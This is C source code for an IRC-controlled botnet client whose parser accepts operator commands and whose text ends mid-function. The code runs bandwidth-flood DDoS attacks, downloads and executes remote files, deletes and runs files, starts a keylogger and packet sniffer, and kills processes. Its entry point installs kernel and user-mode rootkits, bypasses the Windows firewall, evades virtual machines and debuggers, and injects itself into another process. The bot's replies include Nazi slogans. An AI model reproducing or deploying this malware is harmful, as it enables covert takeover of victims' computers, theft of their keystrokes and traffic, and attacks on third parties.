

#include "bt1.h"
#include "..\Settings\config.h"

//Globals! Nasty!! :|
	bool bAuthed = FALSE;
	char szAuth[LOWBUF], szNick[64];

//Connect To IRC Server And Start Parsing


//Parse Commands
void irc_parse(SOCKET bsock, WSAEVENT event, char *szBuffer)
{
	bool bTopic = FALSE, bSilent = FALSE;
	DWORD dwID;
	char *p[32], szBakBuffer[MASBUF], szCommand[32], *szGroup, szPrefix[8], szRecvBuffer[MASBUF], szSendBuffer[IRCBUF];
	int i, s = 3;
	if (szBuffer == NULL) return;
		strcpy(szRecvBuffer, szBuffer);
		p[0] = strtok(szRecvBuffer, ": \r\n");
		p[1] = strtok(NULL, " \r\n");
		p[2] = strtok(NULL, " \r\n");
		p[s] = strtok(NULL, ": \r\n");	
		
#ifndef NO_CRYPTO
		xor(p[s], xorkey);
#endif

	for (i = 4; i < 32; i++) 
	{
			p[i] = strtok(NULL, " \r\n");

#ifndef NO_CRYPTO
		xor(p[i], xorkey);
#endif

	}
	//Check If Silent Command
	for (i = 1; i < 32; i++)
	{
		if (p[i] == NULL) break;
		if (lstrcmpi(p[i], "-s") == 0) 
		{
				bSilent = TRUE;
				break;
		}
	}
	if ((p[0] == NULL) || (p[1] == NULL)) goto end;
//p[0] - Nick!Ident@Host
//p[1] - IRC Command (PRIVMSG, NOTICE, etc)
//p[2] - Where (#dopebot, etc)
//p[s] - Command / Botname (!login, etc)
//p[s+1] - Command / Parameter 1
//etc
//-----------------------------------------------------------
//-------------CRITICAL-COMMANDS-----------------------------
//-----------------------------------------------------------
//PING Reply (Server)
	if (strcmp("PING", p[0]) == 0)
	{
			sprintf(szSendBuffer, "%s\r\n", p[1]);
			irc_action(bsock, "PONG", szSendBuffer);
		goto end;
	}
//MOTD, Should Be Able To Join Now...
	else if (strcmp("375", p[1]) == 0)
	{
			irc_join(bsock, (char *)channel, (char *)channelpassword, useoschannel);
		goto end;
	}
//If No MOTD Present, Join Anyway.
	else if (strcmp("422" , p[1]) == 0)
	{
			irc_join(bsock, (char *)channel, (char *)channelpassword, useoschannel);
		goto end;
	}
//Change Nick If In Use
	else if (strcmp("433", p[1]) == 0)
	{
			set_botnick(szNick);
			irc_userinfo(bsock, szNick, (char *)servers[i].server, (char *)serverpassword);
			irc_join(bsock, (char *)channel, (char *)channelpassword, useoschannel);
		goto end;
	}
//Wrong Channel Key
	else if (strcmp("475", p[1]) == 0)
	{
			irc_disconnect(bsock, event);

#ifndef NO_FWB
//We Dont Wanna Kill The Process We Injected Into....
		if (is_fwb()) while (1) Sleep(5000);	
#endif	

			ExitProcess(0);	
		goto end;
	}

#ifndef NO_TOPIC
//Topic Command
	else if (strcmp("332", p[1]) == 0)
	{
		char szCmd[32];
			memset(szCmd, 0, sizeof(szCmd));
			s = 4;
			sprintf(p[1], "PRIVMSG");
			p[2] = p[3];
			sprintf(szCmd, p[s]);
			strncpy(szCmd, p[s] + 1, 32);
			p[s] = szCmd;
			sprintf(szBakBuffer, "%s%s", prefix, cmd_botlogin);
		if (strcmp(szCmd, szBakBuffer) == 0) goto end;
			memcpy(szBakBuffer, szCmd, sizeof(szCmd));
			szGroup = strtok(szBakBuffer, ".");
			bTopic = TRUE;
	}
#endif

//If Topic Change, Return.
	else if (strcmp("TOPIC", p[1]) == 0) goto end;
//If Master Gets Kicked Un-Auth Him
	else if ((strcmp("KICK", p[1]) == 0) && (hostcmp(p[0])))
	{
			bAuthed = FALSE;
		goto end;
	}
//If Master Parts Un-Auth Him
	else if ((strcmp("PART", p[1]) == 0) && (hostcmp(p[0])))
	{
			bAuthed = FALSE;
		goto end;
	}
//If Master Quits Un-Auth Him
	else if ((strcmp("QUIT", p[1]) == 0) && (hostcmp(p[0])))
	{
			bAuthed = FALSE;
		goto end;
	}

//If Bot Gets Kicked, REJOIN!
	else if ((strcmp("KICK", p[1]) == 0) && (strcmp(szNick, p[3]) == 0))
	{
			irc_join(bsock, (char *)channel, (char *)channelpassword, useoschannel);
		goto end;
	}
	if ((p[2] == NULL) || (p[s] == NULL)) return;
//PING Reply (Client)
	else if (strcmp("\1PING", p[s]) == 0)
	{
		if (p[4] == NULL) goto end;
			p[2] = strtok(p[0], "!");
			sprintf(szSendBuffer, "%s %s\r\n", "\1PING", p[s+1]);
			irc_msg(bsock, "NOTICE", p[2], szSendBuffer);
		goto end;
	}
//VERSION Reply
	else if (strcmp("\1VERSION\1", p[s]) == 0)
	{
			p[2] = strtok(p[0], "!");
			sprintf(szSendBuffer, "%s %s\1\r\n", "\1VERSION\1", version);
			irc_msg(bsock, "NOTICE", p[2], szSendBuffer);
		goto end;
	}
//-----------------------------------------------------------
//-------------COMMANDS--------------------------------------
//-----------------------------------------------------------
//If BotNick Is p[s] Then Change s To 4, Might Be A Single Bot Command
	if (!bTopic) if (strcmp(szNick, p[s]) == 0) s = 4; else s = 3;
//Check If Proper Prefix
		memset(szPrefix, 0, sizeof(szPrefix));
		memcpy(szPrefix, p[s], 1);
	if (strcmp(prefix, szPrefix) != 0) return;
	else
	{
//Anti BOF
		if (strlen(p[s]) >= 32) return;
//Set Command Var
			strncpy(szCommand, p[s] + 1, 32);
			p[s] = szCommand;
//Set Group Var
			memcpy(szBakBuffer, szCommand, sizeof(szCommand));
			szGroup = strtok(szBakBuffer, ".");
	}
//-----------------------------------------------------------
//-------------BOT-COMMANDS----------------------------------
//-----------------------------------------------------------
	if (strcmp(cmd_botgroup, szGroup) == 0)
	{
//Bot Disconnect
		if (strcmp(cmd_botdisconnect, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
				irc_action(bsock, "QUIT", ":bye...");
				Sleep(1000);
				irc_disconnect(bsock, event);

#ifndef NO_FWB
//We Dont Wanna Kill The Process We Are Injected To....
			if (is_fwb()) while (1) Sleep(5000);
#endif

				ExitProcess(0);
		}
//Bot Info
		else if (strcmp(cmd_botinfo, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
				sprintf(szSendBuffer, "[MAIN] %s", botversion);
			if (!bSilent) irc_msg(bsock, p[1], p[2], szSendBuffer);
			goto end;
		}
//Bot Log
		else if (strcmp(cmd_botlog, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
				sprintf(szSendBuffer, "[MAIN] failed login attempts: %s", szBakBuffer);
				memset(szBakBuffer, 0, sizeof(szBakBuffer));
			if (!bSilent) irc_msg(bsock, p[1], p[2], szSendBuffer);
			goto end;
		}
//Bot Login
		else if (strcmp(cmd_botlogin, p[s]) == 0) 
		{
			if (!bTopic)
			{
				if (bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
			}
			if (strcmp(szNick, p[2]) == 0) 
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
			if (p[s+1] == NULL) goto end;
			if (strcmp(botpassword, p[s+1]) != 0) 
			{
					sprintf(szSendBuffer, " host: %s pass: %s \\/ ", p[0], p[s+1]);
					strcat(szBakBuffer, szSendBuffer);
				goto end;
			}
				bAuthed = 1;
				sprintf(szAuth, p[0]);
			if (!bSilent) irc_msg(bsock, p[1], p[2], "[MAIN] password accepted. heil mein führer! \\o");
			goto end;
		}
//Bot Logout
		else if (strcmp(cmd_botlogout, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
				bAuthed = 0;
			if (!bSilent) irc_msg(bsock, p[1], p[2], "[MAIN] goodbye führer. sieg hiel!");
			goto end;
		}
//Bot Network Info
		else if (strcmp(cmd_botnetinfo, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
				memset(szBakBuffer, 0, sizeof(szBakBuffer));
				get_netinfo(bsock, szBakBuffer);
				sprintf(szSendBuffer, "[MAIN] network info: %s.", szBakBuffer);
			if (!bSilent) irc_msg(bsock, p[1], p[2], szSendBuffer);
			goto end;
		}
//Bot Raw
		else if (strcmp(cmd_botraw, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0) p[2] = strtok(p[0], "!");
				p[0] = strtok(szBuffer, ": \r\n");
				p[1] = strtok(NULL, " \r\n");
				p[2] = strtok(NULL, " \r\n");
				p[3] = strtok(NULL, ": \r\n");
				p[s] = strtok(NULL, "\r\n");
				sprintf(szSendBuffer, p[s]);
				strcat(szSendBuffer, "\r\n");
				send(bsock, szSendBuffer, strlen(szSendBuffer), 0);
			goto end;
		}
//Bot Remove
		else if (strcmp(cmd_botremove, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
				bAuthed = 0;
			if (!bSilent) irc_msg(bsock, p[1], p[2], "[MAIN] removing bot..");
			if (uninstall_bot(FALSE))
			{

#ifndef NO_KERNELKIT
					uninstall_kernelkit();
#endif

#ifndef NO_USERKIT
					uninstall_userkit();
#endif

					irc_action(bsock, "QUIT", ":bye..");
					Sleep(1000);
					irc_disconnect(bsock, event);

#ifndef NO_FWB
//We Dont Wanna Kill The Process We Are Injected To....
				if (is_fwb()) while (1) Sleep(5000);	
#endif

					ExitProcess(0);
			}
				irc_msg(bsock, p[1], p[2], "[MAIN] remove failed!");
			goto end;
		}
//Bot System Info
		else if (strcmp(cmd_botsysinfo, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
				memset(szBakBuffer, 0, sizeof(szBakBuffer));
				get_sysinfo(szBakBuffer);
				sprintf(szSendBuffer, "[MAIN] system info: %s.", szBakBuffer);
			if (!bSilent) irc_msg(bsock, p[1], p[2], szSendBuffer);
			goto end;
		}
		goto end;
	}
//-----------------------------------------------------------
//-------------DDOS-COMMANDS---------------------------------
//-----------------------------------------------------------
#ifndef NO_BANDWITH
	else if (strcmp(cmd_ddosgroup, szGroup) == 0)
	{
		struct bandwith dbn;
//Bandwith Flood
		if (strcmp(cmd_ddosbandwith, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
			if (p[s+1] == NULL) goto end;
			if (p[s+2] == NULL) goto end;
			if (p[s+3] == NULL) goto end;
				sprintf(dbn.szUrl, p[s+1]);
				dbn.bsock = bsock;
			if (!bSilent)
			{
					sprintf(dbn.szAction, p[1]);
					sprintf(dbn.szChannel, p[2]);
			}
				dbn.iTimes = atoi(p[s+2]);
				dbn.iDelay = atoi(p[s+3]);
				sprintf(szSendBuffer, "[BANDWITHFLOOD] downloading %s times: %i delay: %i...", dbn.szUrl, dbn.iTimes, dbn.iDelay);
			if (!bSilent) irc_msg(bsock, p[1], p[2], szSendBuffer);
				CreateThread(NULL, 0, &bandwithflood, &dbn, 0, &dwID);
			goto end;
		}
		goto end;
	}
#endif
//-----------------------------------------------------------
//-------------DOWNLOAD-COMMANDS-----------------------------
//-----------------------------------------------------------
#ifndef NO_DOWNLOAD
	else if (strcmp(cmd_downloadgroup, szGroup) == 0)
	{
		struct download dlf;
		struct update upd;
//Download HTTP
		if (strcmp(cmd_downloadhttp, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
			if (p[s+1] == NULL) goto end;
			if (p[s+2] == NULL) goto end;
			if (p[s+3] == NULL) goto end;
				sprintf(dlf.szUrl, p[s+1]);
				sprintf(dlf.szDestination, p[s+2]);
				dlf.bsock = bsock;
			if (!bSilent)
			{
					sprintf(dlf.szAction, p[1]);
					sprintf(dlf.szChannel, p[2]);
			}
			if (atoi(p[s+3]) == 1)
				dlf.bRun = TRUE;
			else
				dlf.bRun = FALSE;
				sprintf(szSendBuffer, "[DOWNLOAD] downloading %s...", dlf.szUrl);
			if (!bSilent) irc_msg(bsock, p[1], p[2], szSendBuffer);
				CreateThread(NULL, 0, &download_file, &dlf, 0, &dwID);
			goto end;
		}
//Download Update
		else if (strcmp(cmd_downloadupdate, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
			if (p[s+1] == NULL) goto end;
				sprintf(upd.szUrl, p[s+1]);
				sprintf(upd.szFileName, filename);
				sprintf(upd.szRegKeyName, regkeyname);
				sprintf(upd.szServiceName, servicename);
				upd.bUseRegistry = useregistry;
				upd.bUseService = useservice;
 				upd.bsock = bsock;
				upd.event = event;
			if (!bSilent)
			{
					sprintf(upd.szAction, p[1]);
					sprintf(upd.szChannel, p[2]);
			}
				sprintf(szBuffer, "[UPDATE] downloading update %s...", upd.szUrl);
			if (!bSilent) irc_msg(bsock, p[1], p[2], szSendBuffer);
				CreateThread(NULL, 0, &update_file, &upd, 0, &dwID);
			goto end;
		}
		goto end;
	}
#endif
//-----------------------------------------------------------
//-------------FILE-COMMANDS---------------------------------
//-----------------------------------------------------------
#ifndef NO_FILE
	else if (strcmp(cmd_filegroup, szGroup) == 0)
	{
//File Delete
		if (strcmp(cmd_filedelete, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
			if (p[s+1] == NULL) goto end;
			if (delete_file(p[s+1]) == 2) 
			{
				if (!bSilent) irc_msg(bsock, p[1], p[2], "[FILE] bad filepath!");
				goto end;
			}
			else if (delete_file(p[s+1]) == 1)
			{
				if (!bSilent) irc_msg(bsock, p[1], p[2], "[FILE] file in use!");
				goto end;
			}
				sprintf(szSendBuffer, "[FILE] %s deleted.", p[s+1]);
				irc_msg(bsock, p[1], p[2], szSendBuffer);
				goto end;
		}
//File Execute
		else if (strcmp(cmd_fileexecute, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
			if (p[s+1] == NULL) goto end;
			if (p[s+2] == NULL) goto end;
			if (!execute_file(p[s+1], atoi(p[s+2]))) 
			{
				if (!bSilent) irc_msg(bsock, p[1], p[2], "[FILE] bad filepath!");
				goto end;
			}
			if (atoi(p[s+2]) == 1)
				sprintf(szSendBuffer, "[FILE] %s executed [visible].", p[s+1]);
			else
				sprintf(szSendBuffer, "[FILE] %s executed [hidden].", p[s+1]);
			if (!bSilent) irc_msg(bsock, p[1], p[2], szSendBuffer);
			goto end;
		}
//File Open
		else if (strcmp(cmd_fileopen, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
			if (p[s+1] == NULL) goto end;
			if (!open_file(p[s+1])) 
			{
				if (!bSilent) irc_msg(bsock, p[1], p[2], "[FILE] bad filepath!");
				goto end;
			}
				sprintf(szSendBuffer, "[FILE] %s opened.", p[s+1]);
			if (!bSilent) irc_msg(bsock, p[1], p[2], szSendBuffer);
			goto end;
		}
		goto end;
	}
#endif
//-----------------------------------------------------------
//-------------klgGER-COMMANDS----------------------------
//-----------------------------------------------------------
#ifndef NO_klgGER
	else if (strcmp(cmd_klggroup, szGroup) == 0)
	{	
//klg Start
		if (strcmp(cmd_klgstart, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
			if (p[s+1] == NULL) goto end;
				PathStripPath(p[s+1]);
			if (klgger_start(p[s+1]))
			{
				sprintf(szSendBuffer, "[klg] klg started (*BOTDIR*\\%s).", p[s+1]);

#ifdef NO_FWB
				sprintf(szSendBuffer, "[klg] klg started (*WINDIR*\\system32\\%s).", p[s+1]);
#endif
				
			}
			else
				sprintf(szSendBuffer, "[klg] klgger already running!");
			if (!bSilent) irc_msg(bsock, p[1], p[2], szSendBuffer);
			goto end;
		}
//klg Stop
		else if (strcmp(cmd_klgstop, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
			if (klgger_stop())
				sprintf(szSendBuffer, "[klg] klg stopped!");
			else
				sprintf(szSendBuffer, "[klg] klgger not running!");
			if (!bSilent) irc_msg(bsock, p[1], p[2], szSendBuffer);
			goto end;
		}
		goto end;
	}
#endif	
//-----------------------------------------------------------
//-------------PROCESS-COMMANDS------------------------------
//-----------------------------------------------------------
#ifndef NO_PROCESS
	else if (strcmp(cmd_processgroup, szGroup) == 0)
	{
//Process Kill
		if (strcmp(cmd_processkill, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
			if (p[s+1] == NULL) goto end;
			if (kill_process(p[s+1]))
				sprintf(szSendBuffer, "[PROCESS] %s killed.", p[s+1]);
			else
				sprintf(szSendBuffer, "[PROCESS] %s not killed!", p[s+1]);
			if (!bSilent) irc_msg(bsock, p[1], p[2], szSendBuffer);
			goto end;
		}
//Process List
		else if (strcmp(cmd_processlist, p[s]) == 0)
		{
			if (bTopic != TRUE)
			{
				if (bAuthed != 1) goto end;
				if (hostcmp(p[0]) == FALSE) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
			if (!bSilent) irc_msg(bsock, p[1], p[2], "[PROCESS] Listing processes...");
				list_process(bSilent, bsock, p[1], p[2]);
			goto end;
		}
		goto end;
	}
#endif

//-----------------------------------------------------------
//-------------SNIFFER-COMMANDS------------------------------
//-----------------------------------------------------------
#ifndef NO_SNIFFER
	else if (strcmp(cmd_sniffgroup, szGroup) == 0)
	{
//Sniffer Start
		if (strcmp(cmd_snifferstart, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
				sniff(1, bsock, p[1], p[2], bSilent);
			goto end;
		}
//Sniffer Stop
		else if (strcmp(cmd_snifferstop, p[s]) == 0)
		{
			if (!bTopic)
			{
				if (!bAuthed) goto end;
				if (!hostcmp(p[0])) goto end;
				if (strcmp(p[0], szAuth) != 0) goto end;
			}
			if (strcmp(szNick, p[2]) == 0)
			{
					sprintf(szCommand, p[0]);
					p[2] = strtok(szCommand, "!");
			}
				sniff(2, bsock, p[1], p[2], bSilent);
			goto end;
		}
		goto end;
	}
#endif
//MEET THE END
end:
		s = 3;
		bTopic = FALSE;
		bSilent = FALSE;
		memset(p, 0, sizeof(p));
		memset(szBakBuffer, 0, sizeof(szBakBuffer));
		memset(szBuffer, 0, sizeof(szBuffer));
		memset(szCommand, 0, sizeof(szCommand));
		memset(szPrefix, 0, sizeof(szPrefix));
		memset(szRecvBuffer, 0, sizeof(szRecvBuffer));
		memset(szSendBuffer, 0, sizeof(szSendBuffer));	
		return;
}

//Entry Point Of File, "WinMain"
void entry_point()
{
	DWORD dwID;

#ifndef NO_DEBUG
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
		printf("[DEBUG] Mutex sleep, entry_point()\n");	
#endif

#ifdef NO_DEBUG
		Sleep(5000);
#endif

#ifndef NO_DEBUG
		printf("[DEBUG] Creating mutex, entry_point()\n");
#endif

		CreateMutex(NULL, FALSE, botversion);
	if (GetLastError() == ERROR_ALREADY_EXISTS) ExitProcess(0);
		set_priv();

#ifndef NO_VMDETECT
	if (detect_wmw()) emergency_remove();
#endif

#ifndef NO_DEBUGCHK
		CreateThread(NULL, 0, &check_debuggers, NULL, 0, &dwID);
#endif

#ifdef NO_DEBUG
		SetErrorMode(SEM_FAILCRITICALERRORS && SEM_NOALIGNMENTFAULTEXCEPT && SEM_NOGPFAULTERRORBOX && SEM_NOOPENFILEERRORBOX);
	if ((!is_os9x()) && (!is_osnt()))
	{
			uninstall_bot(TRUE);
			ExitProcess(0);
	}
#endif

#ifndef NO_9XHIDEPROC
		hideproc();
#endif

#ifndef NO_INSTALL
		batch_run();
		install_bot();
#endif

#ifndef NO_KERNELKIT
		install_kernelkit();
#endif

#ifndef NO_USERKIT
		install_userkit();
#endif

#ifndef NO_SP2BYPASS
		bypass_sp2fw();
#endif

#ifndef NO_SFC
		patch_tcpip();
#endif

#ifndef NO_FWB
	if (inject_code((char *)injectprocess, &irc_main)) ExitProcess(0);
#endif

#ifndef NO_DEBUG
		printf("[DEBUG] Injection failed/No injection, starting IRC thread, entry_point()\n");
#endif

		CreateThread(NULL, 0, &irc_main, NULL, 0, &dwID);
	while (1) Sleep(5000);
		ExitProcess(0);
		return;
}
DWORD WINAPI irc_main(LPVOID param)
{
	DWORD dwID;
	char szBuffer[MASBUF];
	HOSTENT *he = NULL;
	int i = 0, iRecvd;
	size_t size;
	SOCKET ircsock;
	struct sockaddr sock;
	struct sockaddr_in ircinfo;
	WSADATA ircdata;
	WSAEVENT wsaEvent;
	WSANETWORKEVENTS wsaNetEvent;

#ifndef NO_FWB
		LoadLibrary("shlwapi.dll");
	if (is_fwb())
	{

#ifndef NO_DEBUG
			printf("[DEBUG] Injection sucessful, reseting privileges and loading libs, irc_main()\n");
#endif

//Remote Process Might Not Have Proper Libs Loaded
			LoadLibrary("kernel32.dll");
			LoadLibrary("user32.dll");
			LoadLibrary("advapi32.dll");
			LoadLibrary("msvcrt.dll");
			LoadLibrary("shlwapi.dll");
			LoadLibrary("wininet.dll");
			LoadLibrary("ws2_32.dll");

#ifndef NO_DEBUG
		printf("[DEBUG] Mutex sleep, irc_main()\n");	
#endif

#ifdef NO_DEBUG
		Sleep(5000);
#endif

#ifndef NO_DEBUG
		printf("[DEBUG] Creating mutex, irc_main()\n");
#endif

		CreateMutex(NULL, FALSE, botversion);
	//if (GetLastError() == ERROR_ALREADY_EXISTS) ExitProcess(0);
			set_priv();
	}
#endif

#ifndef NO_SECURE
		CreateThread(NULL, 0, &secu123, NULL, 0, &dwID);
#endif

#ifndef NO_REGSECURE
		CreateThread(NULL, 0, &registry_secure, 0, &dwID);
#endif

#ifndef NO_IDENTD
		CreateThread(NULL, 0, &identd, NULL, 0, &dwID);
#endif

#ifdef NO_FWB
#ifndef NO_DEBUG
		printf("[DEBUG] Checking connection state, irc_main()\n");
#endif
		if (is_fwb()) while (InternetGetConnectedState(NULL, 0) == FALSE) Sleep(30000); //Dun Wurk When Injected? Temp Fix.
#endif

#ifndef NO_DEBUG
		printf("[DEBUG] Setting up socket, irc_main()\n");
#endif

	if (is_os9x()) if (lstrcmpi(servers[i].server, "127.0.0.1") == 0) i = i + 1; //Temp Fix
		set_botnick(szNick);
	if (WSAStartup(MAKEWORD(2,2), &ircdata) != 0) return 0;
	if (gethostbyname(servers[i].server) == NULL) return 0;
		ircinfo.sin_addr.s_addr = *(LPDWORD)gethostbyname((char *)servers[i].server)->h_addr_list[0];
		ircinfo.sin_port = htons(servers[i].port);
		ircinfo.sin_family = AF_INET;
		ircsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ircsock == INVALID_SOCKET) return 0;
		wsaEvent = WSACreateEvent();
		WSAEventSelect(ircsock, wsaEvent, FD_CONNECT | FD_CLOSE | FD_READ);

#ifndef NO_DEBUG
		printf("[DEBUG] Trying to connect to server: %s:%i, irc_main()\n", servers[i].server, servers[i].port);
#endif

		connect(ircsock, (struct sockaddr *)&ircinfo, sizeof(ircinfo));
		recv(ircsock, szBuffer, sizeof(szBuffer), 0);
		irc_userinfo(ircsock, szNick, (char *)servers[i].server, (char *)serverpassword);

#ifndef NO_FTPD
	struct ftp ftps;
		ftps.iPort = ftpdport;
		sprintf(ftps.szFileName, filename);
		sprintf(ftps.szUser, ftpduser);
		sprintf(ftps.szPass, ftpdpass);
		ftps.consock = NULL;
		ftps.bsock = ircsock;
		sprintf(ftps.szAction, "PRIVMSG");
		sprintf(ftps.szChannel, exploitchannel);
		CreateThread(NULL, 0, &ftpd, &ftps, 0, &dwID);
#endif

#ifndef NO_TFTPD
	struct tftp tftps;
		tftps.iPort = tftpdport;
		tftps.bsock = ircsock;
		sprintf(tftps.szFileName, filename);
		sprintf(tftps.szAction, "PRIVMSG");
		sprintf(tftps.szChannel, exploitchannel);
		CreateThread(NULL, 0, &tftpd, &tftps, 0, &dwID);
#endif

#ifndef NO_DEBUG
		printf("[DEBUG] Starting loop, irc_main()\n");
#endif

start:
	while (1)
	{
			WSAWaitForMultipleEvents(1, &wsaEvent, FALSE, WSA_INFINITE, FALSE);
			WSAEnumNetworkEvents(ircsock, wsaEvent, &wsaNetEvent);
			WSAResetEvent(wsaEvent);
		if (wsaNetEvent.lNetworkEvents & FD_CONNECT)
		{
			if (wsaNetEvent.iErrorCode[FD_CONNECT_BIT])
			{

#ifndef NO_DEBUG
					printf("[DEBUG] Connection to %s:%i failed, irc_main()\n", servers[i].server, servers[i].port);
#endif

				for (i = 1; i < ARRAYSIZE(servers); i++)
				{
retry:
					if ((servers[i].server == NULL) && (servers[i].port == 0)) break; 
					if (is_os9x()) if (lstrcmpi(servers[i].server, "127.0.0.1") == 0) //Temp Fix
					{
							i = i + 1;
						goto retry;
					}

#ifndef NO_DEBUG
						printf("[DEBUG] Trying to connect to server: %s:%i, irc_main()\n", servers[i].server, servers[i].port);
#endif

					if (gethostbyname(servers[i].server) != NULL)
					{
							ircinfo.sin_addr.s_addr = *(LPDWORD)gethostbyname((char *)servers[i].server)->h_addr_list[0];
							ircinfo.sin_port = htons(servers[i].port);
							set_botnick(szNick);
							connect(ircsock, (struct sockaddr *)&ircinfo, sizeof(ircinfo));
							recv(ircsock, szBuffer, sizeof(szBuffer) - 1, 0);
							irc_userinfo(ircsock, szNick, (char *)servers[i].server, (char *)serverpassword);
							size = sizeof(struct sockaddr);
						if (getpeername(ircsock, &sock, (int *)&size) == 0) goto start;
					}
				}
			}
		}
		if (wsaNetEvent.lNetworkEvents & FD_READ)
		{
				iRecvd = recv(ircsock, szBuffer, sizeof(szBuffer) - 1, 0);
				szBuffer[iRecvd] = '\0';
				line_parse(ircsock, wsaEvent, szBuffer);
		}
		if (wsaNetEvent.lNetworkEvents & FD_CLOSE)
		{

#ifndef NO_DEBUG
				printf("[DEBUG] Connection closed, irc_main()\n");
#endif

				closesocket(ircsock);
				set_botnick(szNick);
				ircsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				WSAEventSelect(ircsock, wsaEvent, FD_READ | FD_WRITE | FD_CONNECT | FD_CLOSE);
				connect(ircsock, (struct sockaddr *)&ircinfo, sizeof(ircinfo));
				recv(ircsock, szBuffer, sizeof(szBuffer) - 1, 0);
